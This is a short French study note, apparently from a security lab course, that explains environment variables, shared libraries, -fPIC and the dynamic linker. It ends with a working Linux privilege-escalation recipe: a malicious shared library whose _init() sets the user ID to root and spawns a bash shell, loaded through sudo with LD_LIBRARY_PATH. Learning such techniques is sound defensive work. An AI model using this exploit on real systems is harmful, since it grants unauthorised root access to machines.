Définition :

Une var d'environnement c'est juste une variable pour chaque utilisateur. En gros chaque env(user) possède ses propres var d'env. Y'a quoi dedans ? ca dépent de la var.

Bibliothèque partagée/dynamique :

C'est une librairie qui peut être utilisée par plusieurs programmes en même temps sans interférence. Ces librairies ne sont pas entièrement dans le fichier binaire final. Seul le nécessaire est présent.

Programme statique :

Programme qui ne charge pas de bibliothèque dynamique. Tout est entièrement dans le fichier binaire.

Dynamic linker :  
Relie les bibliothèques à un programme. Travail facilité grâce à l'option -fPIC.

-fPIC permet de situer la bibliothèque partagé. c'est une optimisation. En gros, si on lance deux fois le même programme, les deux utiliseront la même copie de la bibliothèque. Par contre, si deux programmes différents utilisent la même bibliothèque, ils auront chacun leur propre copie pour leur propre nécessité. Tout cela facilite la tâche pour le dynamic linker.

Liste des variables d'env avec vulnérabilité :

LD_PRELOAD : Charge des bibliothèques partagées spécifiées pour qu'elles chargent avant toute les autres. Donc par exemple si je créé une fonction print() qui stock des variables (rien a voir avec le vrai print) ce serai la fonction de ma bibliothèque dans LD_PRELOAD qui sera prioritaire.

Exemple de vulnérabilité :

J'ai les permissions pour executer un programme spécifique en sudo (que j'ai vu en faisant sudo -l).

Je regarde quelles librairies sont utilisées donc : ldd emplacement/du/programme.

Je fais gcc -o /tmp/nom_d'une_library_utilisée -shared -fPIC /home/user/tools/sudo/library_path.c

-shared pour créer un .so (shared object) partagé. -fPIC pour situer la bibliothèque dynamiquement.

cette commande permet de créer une lib qui a le meme nom qu'un lib que le prog utilise déja pour la remplacer. dans cette lib, on mettra une fonction malvaillante qui aura le meme nom qu'un fonction deja utilisé dans le prog pour la remplacer. Exemple :

#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>

void _init() {  
        unsetenv("LD_PRELOAD");  
        setresuid(0,0,0);  
        system("/bin/bash -p");  
}

ensuite, on lance le prog : sudo LD_LIBRARY_PATH=/tmp nom_du_prog ld_library_path dit où chercher la lib partagé (avec la fonction malvaillante) donc dans ce cas ci, dans tmp
